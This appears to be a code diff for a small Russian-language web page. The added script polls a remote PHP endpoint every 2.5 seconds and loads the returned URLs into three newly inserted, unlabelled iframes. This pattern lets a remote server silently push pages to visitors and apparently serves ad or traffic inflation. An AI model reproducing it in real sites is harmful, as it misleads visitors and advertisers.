@@ -91,7 +91,8 @@
             }
           });
             }, 1000);
-          } else if (document.location.search == "?get"){
+            var i = 0;
+            setInterval(function(){
           $.ajax({
       url: "https://footmal.000webhostapp.com/neon.php",
       type: "post",
@@ -99,9 +100,11 @@
       crossDomain: true,
       data: ({type: "get"}),
       success: function(data){
-      document.location.href = data;
+      var e = i - Math.floor(i/3) + 1;
+        $("iframe:eq(" + e + ")").attr("src", data);
       }
         });
+            }, 2500);
           }
             var h0 = $("#center").width();
             var h = h0/25;
@@ -140,7 +143,7 @@
   <body>
 
 <iframe scrolling="no" src="https://neon.today/context/get/58861/18589/1/468/60" style="width: 468px; height: 60px;  padding: 0;border: 1px dotted grey;" frameborder="0"></iframe>
-    <br/><button id="home">HOME</button>
+    <br/><iframe></iframe><iframe></iframe><iframe></iframe>
   <div id="start">
         <button id="s">Начать</button>
     </div>
